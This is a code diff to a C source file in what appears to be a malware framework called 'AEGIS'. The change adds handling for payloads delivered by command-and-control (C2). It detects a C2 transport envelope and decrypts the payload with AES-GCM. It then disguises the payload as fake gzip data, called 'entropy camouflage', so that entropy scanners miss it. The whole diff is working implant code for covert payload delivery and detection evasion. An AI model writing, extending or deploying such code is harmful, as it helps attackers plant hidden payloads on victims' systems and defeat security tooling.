@@ -10,6 +10,7 @@
 #include "vault.h"
 #include "../common/config.h"
 #include "../common/logging.h"
+#include "../c2_comms/c2_client.h"
 
 #include <stdio.h>
 #include <stdlib.h>
@@ -30,10 +31,10 @@ typedef struct {
 /* ── Initialization ──────────────────────────────────────────────────────── */
 
 aegis_result_t aegis_vault_init(aegis_vault_ctx_t *ctx,
-                                const uint8_t *encrypted_data, size_t data_len,
+                                const uint8_t *payload_data, size_t data_len,
                                 size_t chunk_size, aegis_crypto_ctx_t *crypto,
                                 aegis_log_ctx_t *log) {
-  if (!ctx || !encrypted_data || data_len == 0 || !crypto)
+  if (!ctx || !payload_data || data_len == 0 || !crypto)
     return AEGIS_ERR_VAULT;
 
   memset(ctx, 0, sizeof(*ctx));
@@ -42,28 +43,84 @@ aegis_result_t aegis_vault_init(aegis_vault_ctx_t *ctx,
   ctx->log = log;
   ctx->chunk_size = (chunk_size > 0) ? chunk_size : AEGIS_NANO_MAX_CHUNK_SIZE;
 
+  const uint8_t *decrypted_ptr = payload_data;
+  size_t decrypted_len = data_len;
+  uint8_t *temp_decrypted = NULL;
+
   /*
-   * Apply entropy camouflage: wrap the encrypted data in a fake
+   * Detect and decrypt AEGIS C2 Transport Envelope.
+   * This "connects" the C2 delivery to the internal Nanomachine logic.
+   */
+  if (data_len > sizeof(aegis_c2_envelope_t)) {
+    const aegis_c2_envelope_t *env = (const aegis_c2_envelope_t *)payload_data;
+    if (env->magic == AEGIS_C2_HEADER_MAGIC) {
+        aegis_log_event(log, LOG_CAT_VAULT, LOG_SEV_INFO,
+                        "Detected C2 envelope (type=0x%02x, len=%u). Decrypting transport layer...",
+                        env->msg_type, env->payload_len);
+
+        size_t ct_len = env->payload_len;
+        if (ct_len + sizeof(aegis_c2_envelope_t) <= data_len) {
+            temp_decrypted = malloc(ct_len);
+            if (!temp_decrypted) return AEGIS_ERR_ALLOC;
+
+            /* Reconstruct AAD: Envelope with zeroed IV and TAG */
+            aegis_c2_envelope_t aad_env;
+            memcpy(&aad_env, env, sizeof(aegis_c2_envelope_t));
+            memset(aad_env.iv, 0, AEGIS_GCM_IV_BYTES);
+            memset(aad_env.tag, 0, AEGIS_GCM_TAG_BYTES);
+
+            aegis_result_t drc = aegis_decrypt(
+                crypto, payload_data + sizeof(aegis_c2_envelope_t), ct_len,
+                (const uint8_t *)&aad_env, sizeof(aegis_c2_envelope_t),
+                env->iv, env->tag, temp_decrypted);
+
+            if (drc == AEGIS_OK) {
+                decrypted_ptr = temp_decrypted;
+                decrypted_len = ct_len;
+                aegis_log_event(log, LOG_CAT_VAULT, LOG_SEV_INFO,
+                                "Transport layer decrypted successfully (%zu bytes)", decrypted_len);
+            } else {
+                aegis_log_event(log, LOG_CAT_VAULT, LOG_SEV_ERROR,
+                                "Failed to decrypt C2 transport layer (rc=%d). "
+                                "Falling back to raw data.", drc);
+                free(temp_decrypted);
+                temp_decrypted = NULL;
+            }
+        }
+    }
+  }
+
+  /*
+   * Apply entropy camouflage: wrap the inner payload in a fake
    * gzip envelope so it looks like compressed data to entropy scanners.
    */
   size_t wrapped_len = 0;
-  uint8_t *wrapped = malloc(data_len + 18); /* gzip overhead */
-  if (!wrapped)
-    return AEGIS_ERR_ALLOC;
+  uint8_t *wrapped = malloc(decrypted_len + 18); /* gzip overhead */
+  if (!wrapped) {
+      if (temp_decrypted) free(temp_decrypted);
+      return AEGIS_ERR_ALLOC;
+  }
 
-  aegis_result_t rc = aegis_entropy_camouflage_wrap(encrypted_data, data_len,
+  aegis_result_t rc = aegis_entropy_camouflage_wrap(decrypted_ptr, decrypted_len,
                                                     wrapped, &wrapped_len);
   if (rc != AEGIS_OK) {
     free(wrapped);
-    /* Fall back to storing raw encrypted data */
-    wrapped_len = data_len;
-    wrapped = malloc(data_len);
-    if (!wrapped)
-      return AEGIS_ERR_ALLOC;
-    memcpy(wrapped, encrypted_data, data_len);
+    /* Fall back to storing raw data */
+    wrapped_len = decrypted_len;
+    wrapped = malloc(decrypted_len);
+    if (!wrapped) {
+        if (temp_decrypted) free(temp_decrypted);
+        return AEGIS_ERR_ALLOC;
+    }
+    memcpy(wrapped, decrypted_ptr, decrypted_len);
     ctx->camouflaged = false;
   } else {
     ctx->camouflaged = true;
+  }
+
+  if (temp_decrypted) {
+      AEGIS_WIPE(temp_decrypted, decrypted_len, 1);
+      free(temp_decrypted);
   }
 
   /*
